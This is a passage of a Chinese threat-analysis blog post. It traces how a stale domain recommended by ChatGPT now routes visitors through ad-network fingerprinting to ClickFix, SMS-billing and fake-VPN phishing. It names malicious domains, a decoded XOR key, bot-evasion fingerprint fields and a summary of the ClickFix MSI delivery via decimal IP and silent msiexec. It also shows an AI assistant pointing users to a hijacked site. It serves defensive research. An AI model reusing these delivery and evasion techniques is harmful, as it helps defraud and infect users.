---
title: 【微信】复盘一次由GPT 推荐引出的攻击链
source: https://mp.weixin.qq.com/s/LHapo4sCOLIJMzOIwMfxsQ
source_host: mp.weixin.qq.com
clip_date: 2026-10-12T08:38:34+08:00
trace_id: cd45e001-aac9-4c67-b685-78c0efa15566
content_hash: cbef286c6d8e118171b3e04259e2f79e73b4b802dcbae42dabed0f4a0cc5e5b9
status: synced
tags:
  - 微信
  - 风控对抗
  - 设备指纹
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: ChatGPT 推荐的旧域名 livereport.com 已被黑产控制，同一入口多次访问分别落地 ClickFix 投递 MSI、境外短信扣费和仿冒 VPN 三类钓鱼。
ai_summary_style: key-points
images_status:
  total: 34
  succeeded: 34
  failed_urls: []
notion_page_id: 3f775244-d011-8136-9101-efffe1f2da4f
ioc:
  cves: []
  cwes: []
  hashes:
    - 0083cb27f7054ca6e7b28c464610b445
    - a4372536d8244d648171d1d351b58a4e
    - c092d2a4b2beb0f66c919bd2a5a079e6f8125ad0d0ae66dbfd4178b735499150
    - eabba242835c026f1337e47a63483ddb
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> ChatGPT 推荐的旧域名 livereport.com 已被黑产控制，同一入口多次访问分别落地 ClickFix 投递 MSI、境外短信扣费和仿冒 VPN 三类钓鱼。
> 
> - **入口成因：** 大模型语料仍保留该域名"港股数据站"的旧身份；对 curl/爬虫仅返回 "OK"，只放行真实浏览器。
> - **分发机制：** 经 fhvfd.com、wy903.com 两轮指纹采集（同异或密钥 `7936zdyhub8iy9ajnkr4nm`、SDK 248_12_OF）与"在线过滤"，再由广告网络竞价交付，故结果随机、扫描难复现。
> - **短信扣费：** 页面预取号码以规避手势限制，单次预填 29 个境外号码（+370/+7 993,+969/+32 460），问答循环无终止条件反复发送，估算每次二三十元。
> - **ClickFix：** 剪贴板混淆命令靠 `%CMDCMDLINE%` 第 18 位取双引号还原，下载十进制 IP `392073560` 即 23.94.145.88，经 msiexec 静默安装 `%TEMP%\S.msi`。
> - **狩猎思路：** 用 urlscan `domain:` 反查请求同一分发节点却停在 example.com 的站点，即同类斗篷入口。

**huasec** *2026年10月12日 08:15*

一、摘要

笔者在ChatGPT中查询港股递表公司时，回答推荐了一个名为LiveReport的站点 www.livereport.com。该域名历史上是港股数据站，目前已无正常内容。我多次访问后分别落地到三类不同的钓鱼行为：仿冒Cloudflare验证的 ClickFix页面（投递 MSI）、面向中国电信安卓用户的国际短信扣费页、仿冒 VPN 的软件下载站。本文按请求顺序还原钓鱼分发链路，对 ClickFix 命令和短信扣费页源码做详细分析，文末给出此次事件的IOC。

```nginx
ChatGPT 回答中的 LiveReport 链接
        │
        ▼
www.livereport.com ─── 非浏览器请求：返回 "OK"
        │
        ▼ 浏览器请求
广告流量分发（fhvfd.com → wy903.com，两次指纹采集 + 实时过滤 + 竞价）
        │
        ├── 手法一：track.cybersafezones.com（BeMob）→ justverify.click 二维码闸门
        │      └─ 手机扫码 → track.securzones.com → redirzyn.com → land.halumcaprice.com
        │           └─ 假滑块 → sms: 29 个境外号码 → 问答循环反复发送 → downloadmyappsnow.com APK
        │
        ├── 手法二：6fp6hs.pulsarflowtech.lol 假 Cloudflare 验证
        │      └─ 剪贴板写入混淆命令 → cmd → PowerShell → 23.94.145.88 下载 MSI → msiexec 静默安装
        │
        └── 手法三：u.33ai.my “安全屋VPN” 下载页
```

* * *

## 二、入口分析：一个被 AI 记住的旧域名

## 2.1 ChatGPT 的推荐

查询“港股递表公司”时，ChatGPT给出了港交所披露易、LiveReport、AASTOCKS、IPO Zao四个渠道，对LiveReport的描述是“适合不想逐条翻阅港交所公告、希望直接查看 IPO 名单和状态的情况”。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/033d45336da9c00d.jpg)

## 2.2 域名现状

对该域名做了三项检查：

Google搜索"www.livereport.com"无收录结果，AI概览给出的描述是该域名处于未激活状态，显示coming soon 占位页。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e9e41f114046330a.jpg)

Bing搜索同样无结果，但相关搜索中仍保留“港股通大数据”“livereport 大数据平台”“活报告live report”等关联词，可以确认该域名历史上对应一个港股数据站点。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a5f86585e33d9ff5.jpg)

命令行直接请求，响应体只有 OK：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/576f962b76d80d0c.jpg)

对爬虫和命令行返回无害内容、只对真实浏览器放行后续跳转。结合以上三点，可以判断该域名已停止原有业务，当前由他人控制并接入流量变现。而大模型的训练语料或检索索引中仍保留着它“港股数据官网”的旧身份，这是本次事件的入口成因。

* * *

## 三、手法一：从二维码引流到国际短信扣费

## 3.1 现象与链路总览

同一个入口，不同时间访问得到的落地页不同：第一次从 ChatGPT 点击进入的是假 Cloudflare 验证页；之后在地址栏直接访问，得到的是“您的访问受限，请用手机浏览器扫描下面二维码”页面；再次访问则是“安全屋VPN”下载站。

对第二次访问全程抓包，DevTools 的 Initiator 链如下：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9953a89a206bb05e.jpg)

按时间顺序整理：

|     |     |     |     |
| --- | --- | --- | --- |
| #   | 请求  | 方法  | 作用  |
| 1   | www.livereport.com → getUserInfo | GET | 入口，采集访客基础信息 |
| 2   | xml-v4.clickpathworks.com/click?i=... | GET | 流量交换节点 |
| 3   | fhvfd.com/api/submit_form_request?p=<rid>&ts=...&z=11265587 | POST | 第一次指纹采集 |
| 4   | fhvfd.com/api/sf_touch、fhvfd.com/qlog/add | POST | 打点与日志 |
| 5   | fhvfd.com/api/win_request | GET | 竞价胜出 |
| 6   | wy903.com/11861982/?var=livereport.com&ymid=... → sftouch | GET | 进入第二个广告位 |
| 7   | my.rtmark.net/img.gif?f=merge&userId=... | POST | 用户 ID 合并 |
| 8   | wy903.com/qlog/add?userId=... | POST | 打点  |
| 9   | wy903.com/?z=11861982&syncedCookie=false&rhd=false | POST | 第二次指纹采集与在线过滤 |
| 10  | track.cybersafezones.com/go/<uuid>?cost=0.001087&... | GET | 广告主侧跟踪器（BeMob） |
| 11  | www.justverify.click/Chinese/Captcha/verifynow_visitor_id?... | GET | 落地页：二维码闸门 |

其中第 3、4、7、8、9 步为 POST 请求，携带了完整的访客指纹。下面按顺序逐个解析。

## 3.2 第 3 步：fhvfd.com 第一次指纹采集

```apache
POST https://fhvfd.com/api/submit_form_request?p=9921d042-54e8-46d0-abb2-60661f347ab1&ts=1791615297&z=11265587
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7b9952e89c0ac260.jpg)

请求体为 URL 表单，解码后如下（adex 字段为加密数据，单独处理）：

```ini
ad_scheme = 1
p = 9921d042-54e8-46d0-abb2-60661f347ab1
hil = 1
jsp = 1
ng = true
ix = false
pt = false
np = true
nw = true
nb = true
sw = 1494
sh = 934
dpr = 1.5
pl = https://fhvfd.com/api/submit_form_request?p=9921d042-54e8-46d0-abb2-60661f347ab1&ts=1791615297&z=11265587
wy = 0
wx = 0
ww = 1494
wh = 886
cw = 1494
wiw = 1494
wih = 442
wfc = 0
sah = 886
navlng = zh-CN
drf = 
wgl = ANGLE (Intel, Intel(R) Iris(R) Xe Graphics (0x0000A7A0) Direct3D11 vs_5_0 ps_5_0, D3D11)
tb = false
btz = Asia/Shanghai
bto = -480
pnt = 0
pnrc = 0
bml = 1
bmi = true
vsbl = true
swf = false
os = windows
os_version = 19.0.0
is_mobile = false
browser_version = 155.0.8059.39
adex = {"...": "<加密，见下方解密结果>"}
extm = 495
```

明文字段已包含较完整的环境信息：

```javascript
屏幕与窗口：屏幕 sw×sh = 1494×934，可用高度 sah = 886，外窗口 ww×wh = 1494×886，页面可视区 wiw×wih = 1494×442，dpr = 1.5。其中 wih 只有 wh 的一半，原因是抓包时 DevTools 停靠在窗口下半部分。外窗口与可视区高度差异常，是识别“打开了开发者工具的访客”的常用依据，也就是说分发方能够感知到分析行为。
显卡：wgl 为 ANGLE (Intel, Intel(R) Iris(R) Xe Graphics ...)，真实物理显卡。
区域：btz = Asia/Shanghai，bto = -480，navlng = zh-CN。
系统与浏览器：os = windows，is_mobile = false，browser_version = 155.0.8059.39。这里的四段式版本号来自 UA Client Hints，比 UA 字符串中的 155.0.0.0 更精确。

来源：drf（document.referrer）为空，入口页通过脚本跳转，未留下 Referer。
hil、jsp、ng、ix、pt、np、nw、nb、vsbl、swf 等为一组布尔检测项，从命名看对应 JS 可用性、页面可见性、插件存在性等，具体含义需要结合采集脚本确认。
```

adex 字段解密

adex 的值为 {"sync":"TBtSUh8cJhwUBWcf..."}。sync 经 Base64 解码后为不可读的二进制数据。由于明文字段 wgl 中已有显卡型号字符串，可以推断加密内容中必然包含同一字符串，以此作为已知明文反推，得到加密方式为 22 字节密钥循环异或：

```ini
key   = "7936zdyhub8iy9ajnkr4nm"
plain = base64decode(sync)[i] XOR key[i % 22]
```

密钥固定写在前端采集脚本中，严格说这只是编码混淆。解密后的完整内容如下：

```json
{
  "adex_tag_version": "248_12_OF",
  "durs": {"ri_rv": 63.6, "rpp": 160, "tzo": 0.3, "ww_wh_wiw_wih_wx_wy_ix_wfc_sah_sh_sw_saw_cw_ch_dpr": 0.7, "ts_detected_mtp": 0.3, "jsua": 0.1, "np_pd": 3.2, "npn": 0.4, "hil": 1.3, "uid": 0.1, "nap": 0, "eval": 0.1, "hc": 0.2, "dm": 0, "rtt": 0.3, "ch_obj": 0.1, "nw_wd": 0.1, "oscpu": 0.1, "hidden": 0.6, "ch_obj_index": 0.6, "win_keys_length": 0.3, "color_depth": 0.2, "vendor": 0, "gamepads": 4.4, "nl_nls": 0.4, "color_gamut": 1.1, "pfl": 0.5, "csi": 0.4, "clt": 8.3, "platform_detector": 1.5, "nes": 0.2, "total": 250.2},
  "ri": "ANGLE (Intel, Intel(R) Iris(R) Xe Graphics (0x0000A7A0) Direct3D11 vs_5_0 ps_5_0, D3D11)",
  "rv": "Google Inc. (Intel)",
  "rpp": 0,
  "tzo": -480,
  "ww": 1494,
  "wh": 886,
  "wiw": 1494,
  "wih": 442,
  "wx": 0,
  "wy": 0,
  "ix": 0,
  "wfc": 0,
  "sah": 886,
  "sh": 934,
  "sw": 1494,
  "saw": 1494,
  "dpr": 1.5,
  "mtp": 0,
  "ts_detected": 0,
  "jsua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36",
  "np": 1,
  "pd": "internal-pdf-viewer:isPI;internal-pdf-viewer:isPI;internal-pdf-viewer:isPI;internal-pdf-viewer:isPI;internal-pdf-viewer:isPI;",
  "npn": "PDF Viewer;Chrome PDF Viewer;Chromium PDF Viewer;Microsoft Edge PDF Viewer;WebKit built-in PDF",
  "hil": 1,
  "uid": null,
  "nap": "Win32",
  "eval": 33,
  "hc": 16,
  "dm": 32,
  "rtt": 350,
  "ch_obj": 1,
  "nw": 1,
  "wd": false,
  "oscpu": null,
  "hidden": false,
  "ch_obj_index": 208,
  "win_keys_length": 239,
  "color_depth": 24,
  "vendor": "Google Inc.",
  "gamepads": 0,
  "nl": "zh-CN",
  "nls": "zh-CN,zh,en",
  "color_gamut": "srgb",
  "pfl": "",
  "csi": {"isBotByPageT": 0, "onloadT": 0, "pageT": 3539.358, "startE": 1791615294439, "tran": 15},
  "clt": {"commitLoadTime": 1791615297.394, "connectionInfo": "http/1.1", "finishDocumentLoadTime": 0, "finishLoadTime": 0, "firstPaintAfterLoadTime": 0, "firstPaintTime": 0, "navigationType": "Other", "npnNegotiatedProtocol": "http/1.1", "requestTime": 1791615294.439, "startLoadTime": 1791615294.439, "wasAlternateProtocolAvailable": false, "wasFetchedViaSpdy": false, "wasNpnNegotiated": true},
  "platform_detector": {"is_android": false, "is_trident": false, "is_chromium_86_or_newer": true, "is_chromium": true, "is_edge": false, "is_gecko": false, "is_web_kit": false, "is_web_kit_606_or_newer": false, "is_desktop_safari": false, "is_chromium_opera": false},
  "client_id": "1db9169f-90f4-4b2d-b517-bc47aab19c1f",
  "custom_id_1": "dsp-submit-form",
  "custom_id_2": "livereport.com",
  "traffic_source_id": "11265587",
  "oa_id": "eabba242835c026f1337e47a63483ddb",
  "r_uid": "9921d042-54e8-46d0-abb2-60661f347ab1",
  "method": "jstag",
  "nb": 1,
  "ng": 1,
  "pt": 0,
  "pl": "https://fhvfd.com/api/submit_form_request?p=9921d042-54e8-46d0-abb2-60661f347ab1&ts=1791615297&z=11265587",
  "drf": "",
  "tz": "Asia/Shanghai",
  "pnt": 0,
  "jsp": 1,
  "pnrc": 0,
  "swf": false
}
```

各字段与浏览器 API 的对应关系及检测目的：

|     |     |     |
| --- | --- | --- |
| 字段  | 采集内容（本次取值） | 检测目的 |
| ri / rv | WebGL 渲染器 / 厂商（Intel Iris Xe） | 虚拟机、无头浏览器多为 SwiftShader、llvmpipe 等软件渲染 |
| jsua / nap | UA 字符串 / navigator.platform（Win32） | 与 Client Hints 交叉校验，识别伪造 UA |
| eval | eval.toString().length（33） | Chrome 为 33，Firefox 为 37，用于识别 UA 与内核不一致 |
| ch_obj / ch_obj_index | window.chrome 是否存在（1）及其在 window 属性中的位置（208） | 识别无头 Chrome 或伪装成 Chrome 的其他浏览器 |
| win_keys_length | Object.keys(window).length（239） | 自动化框架注入全局变量会改变该值 |
| wd  | navigator.webdriver（false） | Selenium、Puppeteer 默认为 true |
| csi / clt | chrome.csi() / chrome.loadTimes() | 仅真实 Chrome 提供的私有 API，isBotByPageT 字段名直接表明用途 |
| pd / npn / np | PDF 插件列表（5 项） | 无头模式下插件列表通常为空 |
| hc / dm | CPU 核数（16）/ 内存（32GB） | 沙箱与云主机配置特征明显 |
| rtt | 网络往返时延（350ms） | 辅助识别机房网络 |
| tzo / tz / nl / nls | \-480 / Asia/Shanghai / zh-CN,zh,en | 与 IP 地理位置交叉校验，识别代理 |
| mtp / ts_detected / platform_detector | 触点数 0 / 无触屏 / 内核判断 | 区分桌面与移动设备，决定后续落地页类型 |
| color_depth / color_gamut / gamepads | 24 / srgb / 0 | 增加指纹熵值 |
| durs | 各项检测耗时（合计 250ms） | 采集脚本自身的性能统计 |

末尾的标识字段用于关联整条链路：

```apache
custom_id_2: "livereport.com"：记录流量来源站点；
custom_id_1: "dsp-submit-form"：本跳为 DSP 侧表单提交；
traffic_source_id: "11265587"：与 URL 中 z=11265587 一致，即第一个广告位；
client_id: "1db9169f-..."：反作弊服务的租户标识；
r_uid与 URL 参数 p 相同，oa_id 为本跳分配的访客 ID；
adex_tag_version: "248_12_OF"、method: "jstag"：采集 SDK 版本与接入方式。
```

## 3.3 第 4 步：fhvfd.com 日志上报

```apache
POST https://fhvfd.com/qlog/add?p_rid=9921d042-54e8-46d0-abb2-60661f347ab1
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/614c6eef4e0c32ab.jpg)

请求体为 {"sync":"...","async":"..."}。其中 sync 与第 3 步的 adex.sync 逐字节相同，是同一份同步指纹的重复上报。async 为异步采集项，使用同一密钥解密后如下：

```json
{
"adex_tag_version": "248_12_OF",
"durs": {"bat": 24.4, "undefined": 22.3, "hidden_iframe": 62, "mdv": 61.9, "blth": 88.1, "total": 91},
"bat": {"is_bat": 1, "charging": 1, "charging_time": 0, "discharging_time": null, "level": 1},
"jspf": {"s": "v1", "d": "qqqqqqqqqqqqqgo="},
"hidden_iframe": 0,
"mdv": {"c": 21},
"blth": {"supported": true, "available": true, "reason": null},
"client_id": "1db9169f-90f4-4b2d-b517-bc47aab19c1f",
"custom_id_1": "dsp-submit-form",
"custom_id_2": "livereport.com",
"traffic_source_id": "11265587",
"oa_id": "eabba242835c026f1337e47a63483ddb",
"r_uid": "9921d042-54e8-46d0-abb2-60661f347ab1",
"method": "jstag",
"hints": {"os": "windows", "os_version": "19.0.0", "is_mobile": "false", "browser_version": "155.0.8059.39"}
}
```

异步部分采集的是需要等待 Promise 返回的浏览器能力：

|     |     |     |
| --- | --- | --- |
| 字段  | 采集内容（本次取值） | 检测目的 |
| bat | navigator.getBattery()：有电池、充电中、电量 100% | 长期满电充电是台式机或虚拟机的常见状态 |
| blth | navigator.bluetooth.getAvailability()：可用 | 服务器与虚拟机通常无蓝牙 |
| mdv | navigator.mediaDevices.enumerateDevices()：21 个 | 媒体设备数为 0 常见于沙箱 |
| hidden_iframe | 是否位于隐藏 iframe 中（0） | 识别将广告嵌入不可见 iframe 的刷量行为 |
| jspf | v1 位图 qqqqqqqqqqqqqgo= | Base64 解码为连续的 0xAA，推测为一组特性探测结果的位图 |
| hints | UA Client Hints | 与同步部分 UA 交叉校验 |

## 3.4 第 5、6 步：竞价胜出与跳转

fhvfd.com/api/win_request 之后，浏览器跳转至：

```apache
GET https://wy903.com/11861982/?var=livereport.com&ymid=9921d042-54e8-46d0-abb2-60661f347ab1
```

var 参数再次标明来源站点为 livereport.com，ymid 传递上一跳的访客 ID。

随后请求

wy903.com/sftouch?branchId=0&p_rid=7d5811cb-...&p_src=sf&rb=R2J-tOJb...，此处分配了新的会话 ID p_rid=7d5811cb-...，并首次下发 rb 令牌。

## 3.5 第 7 步：my.rtmark.net ID 合并

```apache
POST https://my.rtmark.net/img.gif?f=merge&userId=0083cb27f7054ca6e7b28c464610b445&z=11861982&p_rid=7d5811cb-3c93-487c-95a1-5822389acfc0&p_src=sf&csflbck=normal_async
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4a1c0c4cb89d9d4f.jpg)

请求体为明文，与 URL 参数一致：

```ini
f = merge
userId = 0083cb27f7054ca6e7b28c464610b445
z = 11861982
p_rid = 7d5811cb-3c93-487c-95a1-5822389acfc0
p_src = sf
csflbck = normal_async
```

该请求以 1×1 像素图片的形式出现，实际功能由 f=merge 决定：将广告网络长期持有的用户 ID（userId=0083cb27...，存放在 rtmark.net 的第三方 Cookie 中）与本次会话 ID（p_rid=7d5811cb...）绑定。此后该访客从任何接入同一网络的站点进入，都能被识别为同一用户，并带着历史画像参与竞价。csflbck=normal_async 推测为 Cookie 同步的回退方式。

## 3.6 第 8 步：wy903.com 日志上报

```apache
POST https://wy903.com/qlog/add?userId=0083cb27f7054ca6e7b28c464610b445&p_rid=7d5811cb-3c93-487c-95a1-5822389acfc0&z=11861982
```

请求体为明文，与 URL 参数一致：

```apache
userId = 0083cb27f7054ca6e7b28c464610b445
p_rid = 7d5811cb-3c93-487c-95a1-5822389acfc0
z = 11861982
```

用于记录广告位 11861982 上用户与会话的对应关系，是 ID 合并完成后的确认日志。

## 3.7 第 9 步：wy903.com 第二次指纹采集与在线过滤

```ruby
POST https://wy903.com/?z=11861982&syncedCookie=false&rhd=false
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6230da49c52bf1fb.jpg)

这是整条链路中数据量最大的请求。请求体解码后如下（rb 截断显示）：

```ini
rb = R2J-tOJb2C8HpTkLqW5GXoAPhoUKSBJ4UOQsJJRznnRToG3Hxvlvdr6vitKk...（共 440 字符）
zone = 11861982
hil = 1
jsp = 1
ng = true
ix = false
pt = false
np = true
nw = true
nb = true
sw = 1494
sh = 934
dpr = 1.5
pl = https://wy903.com/11861982/?var=livereport.com&ymid=9921d042-54e8-46d0-abb2-60661f347ab1
wy = 0
wx = 0
ww = 1494
wh = 886
cw = 1494
wiw = 1494
wih = 442
wfc = 0
sah = 886
navlng = zh-CN
drf = https://fhvfd.com/
wgl = ANGLE (Intel, Intel(R) Iris(R) Xe Graphics (0x0000A7A0) Direct3D11 vs_5_0 ps_5_0, D3D11)
tb = false
btz = Asia/Shanghai
bto = -480
pnt = 0
pnrc = 0
bml = 1
bmi = true
vsbl = true
swf = false
os = windows
os_version = 19.0.0
is_mobile = false
browser_version = 155.0.8059.39
adex = {"...": "<加密，见下方解密结果>"}
```

与第 3 步相比，明文部分新增了 rb 与 zone；drf 变为 https://fhvfd.com/，留下了上一跳的 Referer；pl 变为 wy903.com/11861982/?var=livereport.com。URL 中的 syncedCookie=false 表明第三方 Cookie 同步未成功，服务端因此依赖第 7 步的 ID 合并与本次指纹来识别访客。

adex 本次同时包含 sync 与 async，使用同一密钥解密。sync：

```javascript
{
"adex_tag_version": "248_12_OF",
"durs": {"ri_rv": 35.2, "rpp": 32.6, "tzo": 0.1, "ww_wh_wiw_wih_wx_wy_ix_wfc_sah_sh_sw_saw_cw_ch_dpr": 0.1, "ts_detected_mtp": 0, "jsua": 0, "np_pd": 0.1, "hil": 0.2, "uid": 0, "nap": 0, "eval": 0, "hc": 0, "dm": 0, "rtt": 0.1, "ch_obj": 0, "nw_wd": 0, "oscpu": 0, "hidden": 0, "ch_obj_index": 0.2, "win_keys_length": 0.1, "color_depth": 0, "vendor": 0, "gamepads": 0, "nl_nls": 0, "color_gamut": 0.1, "pfl": 0.1, "csi": 0.1, "clt": 0, "platform_detector": 0, "nes": 0, "total": 69.3},
"ri": "ANGLE (Intel, Intel(R) Iris(R) Xe Graphics (0x0000A7A0) Direct3D11 vs_5_0 ps_5_0, D3D11)",
"rv": "Google Inc. (Intel)",
"rpp": 2,
"tzo": -480,
"ww": 1494,
"wh": 886,
"wiw": 1494,
"wih": 442,
"wx": 0,
"wy": 0,
"ix": 0,
"wfc": 0,
"sah": 886,
"sh": 934,
"sw": 1494,
"saw": 1494,
"dpr": 1.5,
"mtp": 0,
"ts_detected": 0,
"jsua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36",
"np": 1,
"pd": "internal-pdf-viewer:isPI;internal-pdf-viewer:isPI;internal-pdf-viewer:isPI;internal-pdf-viewer:isPI;internal-pdf-viewer:isPI;",
"hil": 1,
"uid": null,
"nap": "Win32",
"eval": 33,
"hc": 16,
"dm": 32,
"rtt": 350,
"ch_obj": 1,
"nw": 1,
"wd": false,
"oscpu": null,
"hidden": false,
"ch_obj_index": 208,
"win_keys_length": 241,
"color_depth": 24,
"vendor": "Google Inc.",
"gamepads": 0,
"nl": "zh-CN",
"nls": "zh-CN,zh,en",
"color_gamut": "srgb",
"pfl": "",
"csi": {"isBotByPageT": 0, "onloadT": 1791615299684, "pageT": 1601.313, "startE": 1791615298222, "tran": 15},
"clt": {"commitLoadTime": 1791615299.524, "connectionInfo": "h3", "finishDocumentLoadTime": 1791615299.684, "finishLoadTime": 0, "firstPaintAfterLoadTime": 0, "firstPaintTime": 0, "navigationType": "Other", "npnNegotiatedProtocol": "h3", "requestTime": 1791615298.222, "startLoadTime": 1791615298.222, "wasAlternateProtocolAvailable": false, "wasFetchedViaSpdy": true, "wasNpnNegotiated": true},
"platform_detector": {"is_android": false, "is_trident": false, "is_chromium_86_or_newer": true, "is_chromium": true, "is_edge": false, "is_gecko": false, "is_web_kit": false, "is_web_kit_606_or_newer": false, "is_desktop_safari": false, "is_chromium_opera": false},
"client_id": "1db9169f-90f4-4b2d-b517-bc47aab19c1f",
"custom_id_1": "iclick-submit-form-online-filtration",
"custom_id_2": "livereport.com",
"traffic_source_id": "11861982",
"oa_id": "0083cb27f7054ca6e7b28c464610b445",
"r_uid": "7d5811cb-3c93-487c-95a1-5822389acfc0",
"method": "jstag",
"nb": 1,
"ng": 1,
"pt": 0,
"pl": "https://wy903.com/11861982/?var=livereport.com&ymid=9921d042-54e8-46d0-abb2-60661f347ab1",
"drf": "https://fhvfd.com/",
"tz": "Asia/Shanghai",
"pnt": 0,
"jsp": 1,
"pnrc": 0,
"swf": false
}
async：
{
"adex_tag_version": "248_12_OF",
"durs": {"undefined": 7.1, "bat": 19.4, "blth": 21.4, "hidden_iframe": 23.1, "mdv": 23.4, "total": 25.3},
"jspf": {"s": "v1", "d": "qqqqqqqqqqqqqgo="},
"bat": {"is_bat": 1, "charging": 1, "charging_time": 0, "discharging_time": null, "level": 1},
"blth": {"supported": true, "available": true, "reason": null},
"hidden_iframe": 0,
"mdv": {"c": 21},
"client_id": "1db9169f-90f4-4b2d-b517-bc47aab19c1f",
"custom_id_1": "iclick-submit-form-online-filtration",
"custom_id_2": "livereport.com",
"traffic_source_id": "11861982",
"oa_id": "0083cb27f7054ca6e7b28c464610b445",
"r_uid": "7d5811cb-3c93-487c-95a1-5822389acfc0",
"method": "jstag",
"hints": {"os": "windows", "os_version": "19.0.0", "is_mobile": "false", "browser_version": "155.0.8059.39"}
}
```

两次采集结果的差异如下，设备指纹部分完全一致：

|     |     |     |
| --- | --- | --- |
| 字段  | 第 3 步（fhvfd.com） | 第 9 步（wy903.com） |
| custom_id_1 | dsp-submit-form | iclick-submit-form-online-filtration |
| traffic_source_id | 11265587 | 11861982 |
| r_uid | 9921d042-... | 7d5811cb-... |
| oa_id | eabba242... | 0083cb27...（即第 7 步合并的 userId） |
| pl / drf | fhvfd.com/... / 空 | wy903.com/11861982/... / https://fhvfd.com/ |
| clt.connectionInfo | http/1.1 | h3  |
| win_keys_length | 239 | 241 |
| durs.total | 250.2ms | 69.3ms |

由此可以得出三点结论：

-   两个域名使用相同的密钥、相同的 SDK 版本（248_12_OF）和相同的 client_id，背后是同一套反作弊系统的同一个租户。
    
-   第二跳的 custom_id_1 为 iclick-submit-form-online-filtration，即“在线过滤”。这一跳的作用是实时剔除机器人、沙箱和分析人员，只将判定为真人的流量交付给下游。
    
-   oa_id被替换为第 7 步合并进来的 userId，印证了 ID 合并的作用。
    

关于 rb：该参数为 440 字符的 Base64URL，解码后 328 字节，信息熵约 7.38 bit/byte，接近随机分布，用上述异或密钥无法解出任何结构。它在第 6 步由服务端下发，在此处由浏览器原样回传，应为服务端加密的状态令牌，内容可能包括竞价结果与目标落地页，客户端无从解密。

## 3.8 第 10、11 步：交付给广告主

第 9 步的响应将浏览器导向广告主的跟踪器：

```apache
GET https://track.cybersafezones.com/go/187a2a2c-fe16-41ca-af04-80a57d2c3733?cost=0.001087&visitor_id=1132679264148403015&zoneid=11861983&bannerid=26894479&country=CN&os=windows&user_activity=high&zone_type=in-page-push
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a08f16d37f53a656.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b0411b9037025e9e.jpg)

参数含义：

```ini
cost=0.001087：本次访问的成交价，约 0.001 美元；
country=CN、os=windows、user_activity=high：前两次指纹采集的判定结果；
zone_type=in-page-push：广告形式为页内推送；
bannerid=26894479：广告主在网络中投放的素材 ID。
```

track.cybersafezones.com 以 302 跳转至 www.justverify.click/Chinese/Captcha/verifynow_visitor_id.html，再经两次 308 跳转到最终页面。URL 中的 bemobdata 参数属于 BeMob 跟踪器，广告主用它统计转化、结算佣金。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e2f5a402adf0b358.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4ba8b36ea80fe806.jpg)

## 3.9 二维码闸门页

上述分发链路的最终落地页 justverify.click 显示“您的访问受限，请用手机浏览器扫描下面二维码”，底部提示“您可能需要发送短信”。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f55b1708d91624ee.jpg)

页面逻辑只有几行：

```php
const visitorId   = new URLSearchParams(location.search).get('visitor_id');
const qrTargetUrl = 'https://track.securzones.com/go/67dc1517-98e5-4c0b-a5c8-c942a88a4044?visitor_id='
+ encodeURIComponent(visitorId || '');
new QRCode(qrContainer, { text: qrTargetUrl, width: 200, height: 200 });
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/738de263e384b272.jpg)

引用的 qrcode.min.js 是开源库 qrcodejs，本身无恶意代码。这一页的作用有三点：

-   短信扣费只能在有 SIM 卡的手机上完成，桌面浏览器无法处理 sms: 协议，需要把用户转移到手机；
    
-   目标链接编码在二维码图片中，桌面端安全软件和浏览器 URL 信誉检测无法获取，手机扫码后又脱离了桌面端的防护范围；
    
-   visitor_id贯穿桌面点击与手机扫码，使两端行为归因为同一次转化，用于联盟佣金结算。
    

## 3.10 跳板

手机扫码后的跳转链：

```bash
track.securzones.com/go/67dc1517-...?visitor_id=xxx            BeMob 跟踪器，记录扫码
└─ redirzyn.com/?cat=2&groupds=240&clientId=676&productId=2853&tracking=...
└─ land.halumcaprice.com/?cat=5&groupds=7&clientId=676&productId=2874&af=5002362398404401
```

redirzyn.com 页面标题为 “APPs Slider”，无实际内容，在 DOMContentLoaded 时通过 location.href 跳转：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f798bdb7b58f14de.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/95218378d38f524c.jpg)

为在桌面环境复现手机端流程，后续分析使用 UA 切换插件将浏览器伪装为 Android 10 / Chrome 152：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/42e3d96b1ec4d21f.jpg)

## 3.11 落地页结构

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b5970e40cd19bca3.jpg)

落地页 body 限宽 430px，按手机竖屏设计，由两屏和一个弹窗组成：

|     |     |     |
| --- | --- | --- |
| 区域  | 内容  | 作用  |
| 第一屏 #cont_preg1 | “您好，请拖动滑块以访问以下内容：应用程序，保护和优化您的设备”、“发送短信并验证以访问内容”、滑块 | 假验证，触发第一条短信 |
| 第二屏 #cont_preg2 | 顶栏“您的下载已就绪”、4 段进度条、“回答问题即可访问下载：”、题目与选项、“跳过 · 查看下一推荐” | 问答循环，触发后续短信 |
